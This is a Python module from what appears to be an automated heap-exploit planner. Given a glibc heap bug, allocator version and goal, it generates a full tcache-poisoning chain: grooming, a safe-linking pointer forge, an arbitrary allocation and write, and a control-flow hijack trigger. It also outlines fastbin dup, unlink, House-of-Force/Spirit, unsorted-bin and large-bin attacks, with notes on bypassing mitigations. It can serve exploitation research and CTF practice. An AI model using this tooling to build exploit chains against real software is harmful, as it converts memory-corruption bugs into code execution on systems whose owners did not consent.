"""Heap-vuln -> primitive chaining (Phase 9 frontier, AAHEG-style, analyst-in-the-loop).

Given a described heap vulnerability (use-after-free / double-free / heap overflow), the
allocator environment (glibc version, tcache), and a goal (arbitrary allocation, arbitrary
write, or control-flow hijack), pick an applicable exploitation **technique** and emit the
full step-by-step chain. The tcache-poisoning technique is fully generated (grooming +
safe-linking fd forge + the write + the trigger); other techniques (fastbin dup, unlink,
House-of-*) are a knowledge base with preconditions + the primitive they yield, surfaced as
analyst-guided outlines.

Deterministic and offline. Emitting the chain is the tool's job; mapping its abstract ops
onto a specific target's alloc/free/use interface is the analyst-in-the-loop step (doc 15).
"""
from __future__ import annotations

from dataclasses import dataclass

from .heap import in_tcache_range, is_fastbin, mangle, request2size, tcache_index


@dataclass
class Vuln:
    vclass: str                       # "uaf" | "double_free" | "heap_overflow"
    size: int = 24                    # the vulnerable allocation's request size
    note: str = ""


@dataclass
class Goal:
    kind: str                         # "arbitrary_alloc" | "arbitrary_write" | "control_flow"
    target: int = 0                   # address to allocate-over / write to / the fn pointer
    value: int = 0                    # value to write / code address to transfer to
    trigger: str = ""                 # how the target is used (e.g. "call the fn pointer")


@dataclass
class Env:
    glibc: tuple = (2, 42)
    tcache: bool = True
    has_leak: bool = True             # arbitrary addresses assume a leak (PIE/heap/libc)


# --------------------------------------------------------------- technique knowledge base
def _ver_ge(a, b):
    return a >= b


def _tcache_applies(v: Vuln, e: Env) -> bool:
    return (e.tcache and v.vclass in ("uaf", "double_free", "heap_overflow")
            and in_tcache_range(request2size(v.size)) and _ver_ge(e.glibc, (2, 26)))


def _tcache_chain(v: Vuln, g: Goal, e: Env) -> dict:
    """Full tcache-poisoning chain to `g` (allocate over target, then write/trigger)."""
    cs = request2size(v.size)
    safe_link = _ver_ge(e.glibc, (2, 32))
    steps = [
        {"op": "alloc", "handle": "A", "size": v.size, "note": "victim size-class"},
        {"op": "alloc", "handle": "B", "size": v.size},
        {"op": "free", "handle": "B"},
        {"op": "free", "handle": "A", "note": "tcache head is now A (LIFO)"},
    ]
    forge = ("mangle(addr(A), TARGET)  # safe-linking: (addr(A)>>12) ^ TARGET"
             if safe_link else "TARGET  # no safe-linking (glibc<2.32)")
    if v.vclass == "double_free" and _ver_ge(e.glibc, (2, 29)):
        steps.append({"op": "note", "detail": "glibc>=2.29 tcache double-free key check: "
                      "prefer the UAF write below over free(A);free(A)."})
    steps.append({"op": "write_fd", "handle": "A", "value": forge,
                  "detail": "the heap vuln overwrites the freed chunk A's forward pointer"})
    steps.append({"op": "alloc", "handle": "_", "size": v.size, "note": "returns A"})
    steps.append({"op": "alloc", "handle": "OUT", "size": v.size,
                  "note": "returns TARGET -- arbitrary allocation"})
    primitive = "arbitrary allocation"
    if g.kind in ("arbitrary_write", "control_flow"):
        steps.append({"op": "write", "handle": "OUT", "value": "VALUE",
                      "detail": "write attacker data into the chunk that overlaps TARGET"})
        primitive = "arbitrary write"
    if g.kind == "control_flow":
        steps.append({"op": "trigger", "detail": g.trigger or
                      "cause the program to use TARGET (call the overwritten pointer)"})
        primitive = "control-flow hijack"
    return {
        "ok": True, "technique": "tcache_poisoning", "auto": True, "primitive": primitive,
        "chunk_size": cs, "tcache_index": tcache_index(cs), "safe_linking": safe_link,
        "steps": steps, "mangle": mangle, "target": g.target, "value": g.value,
        "notes": [
            f"TARGET ({hex(g.target)}) must be 16-byte aligned (tcache alignment check).",
            "TARGET/VALUE are concrete addresses -- supply them from symbols (no-PIE) or a "
            "leak (PIE/heap/libc).",
        ],
    }


# advisory techniques: preconditions + the primitive they yield (analyst-guided outline)
_ADVISORY = [
    {"technique": "fastbin_dup", "primitive": "arbitrary allocation",
     "applies": lambda v, e: v.vclass in ("double_free", "uaf")
     and 0x20 <= request2size(v.size) <= 0x80,
     "outline": "double-free a fastbin chunk (bypass the fd==this check by cycling a 2nd "
                "chunk), then two mallocs return the dup'd chunk; forge its fd to a fake "
                "chunk near the target (needs a valid size field at target-0x8)."},
    {"technique": "unlink", "primitive": "write a pointer to &(P) (near-arbitrary write)",
     "applies": lambda v, e: v.vclass == "heap_overflow",
     "outline": "overflow a chunk's size/prev_size + fd/bk of a free small/large-bin chunk so "
                "that unlink() (on coalesce) writes &P-0x18 over a pointer P; needs a pointer "
                "to a controlled chunk (P) and passes the modern fd/bk consistency check."},
    {"technique": "house_of_force", "primitive": "arbitrary allocation",
     "applies": lambda v, e: v.vclass == "heap_overflow" and not _ver_ge(e.glibc, (2, 29)),
     "outline": "overflow the top chunk's size to a huge value, then malloc a computed size to "
                "move the top to an arbitrary address (removed by the top-size check in "
                "glibc>=2.29)."},
    {"technique": "house_of_spirit", "primitive": "arbitrary allocation",
     "applies": lambda v, e: v.vclass in ("uaf", "heap_overflow"),
     "outline": "free() a pointer into attacker-controlled memory with a forged chunk header "
                "(valid size, aligned), then malloc returns it."},
    {"technique": "unsorted_bin_attack",
     "primitive": "write a libc (main_arena) address to a chosen location",
     "applies": lambda v, e: v.vclass in ("uaf", "heap_overflow")
     and not is_fastbin(request2size(v.size)),
     "outline": "corrupt a free unsorted-bin chunk's bk to (TARGET-0x10); the next malloc that "
                "scans the unsorted bin writes &main_arena.bins[...] to TARGET (glibc>=2.29 "
                "added a bk-integrity check -- pair with a large-bin attack on modern libc)."},
    {"technique": "large_bin_attack",
     "primitive": "write a heap/controlled address to a chosen location",
     "applies": lambda v, e: v.vclass in ("uaf", "heap_overflow")
     and request2size(v.size) >= 0x400,
     "outline": "with two large chunks sorted into the same large bin, corrupt the first's "
                "bk_nextsize (and fd_nextsize) so inserting the second writes its address to "
                "TARGET (bk_nextsize+0x20); the modern go-to for a controlled write on "
                "glibc>=2.30."},
]


TECHNIQUES = [
    {"technique": "tcache_poisoning", "primitive": "arbitrary allocation",
     "applies": _tcache_applies, "build": _tcache_chain, "auto": True},
]


def plan_exploit(vuln: Vuln, goal: Goal, env: Env | None = None) -> dict:
    """Select a technique for `vuln` that achieves `goal` under `env`, and emit its chain.
    Returns the auto-generated chain when one applies, plus any advisory alternatives."""
    env = env or Env()
    advisory = [{"technique": t["technique"], "primitive": t["primitive"],
                 "outline": t["outline"]}
                for t in _ADVISORY if t["applies"](vuln, env)]
    for t in TECHNIQUES:
        if t["applies"](vuln, env):
            chain = t["build"](vuln, goal, env)
            chain["advisory_alternatives"] = advisory
            chain["vuln"] = {"class": vuln.vclass, "size": vuln.size}
            chain["goal"] = {"kind": goal.kind, "target": hex(goal.target),
                             "value": hex(goal.value)}
            return chain
    if advisory:
        return {"ok": False, "reason": "no auto-generated technique applies; analyst-guided "
                "options below", "advisory_alternatives": advisory}
    return {"ok": False, "reason": f"no known heap technique for {vuln.vclass} under "
            f"glibc {env.glibc}"}
